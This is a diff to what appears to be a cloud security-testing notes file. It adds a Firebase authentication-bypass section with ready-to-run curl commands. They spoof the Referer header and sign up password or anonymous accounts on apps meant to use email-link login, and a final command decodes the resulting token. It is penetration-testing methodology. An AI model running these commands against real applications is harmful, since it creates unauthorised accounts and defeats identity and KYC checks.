@@ -17,6 +17,34 @@
 - App Engine default service with no IAP
 - Public BigQuery datasets
 
+### Firebase Auth Provider Bypass (High-Value Pattern)
+
+Apps using email-link (passwordless) auth often leave password auth ENABLED in Firebase config. Test:
+
+```bash
+# Password signup (bypass email-link flow)
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"Pass123!","returnSecureToken":true}'
+# SUCCESS = idToken with sign_in_provider: "password"
+
+# Anonymous signup
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"returnSecureToken":true}'
+# ADMIN_ONLY_OPERATION = disabled (good). idToken = enabled (vuln).
+
+# Decode JWT to confirm bypass
+echo "$TOKEN" | cut -d. -f2 | base64 -d | python3 -m json.tool
+# Check firebase.sign_in_provider != expected provider
+```
+
+**Impact:** Account creation bypassing intended verification flow. On regulated platforms (gambling, finance) = KYC bypass = Medium-High.
+
+**Key:** Firebase API keys are referer-restricted, not secret. Add `-H "Referer: https://TARGET/"` to all Identity Toolkit calls.
+
 ### Metadata Service
 ```bash
 # Instance metadata
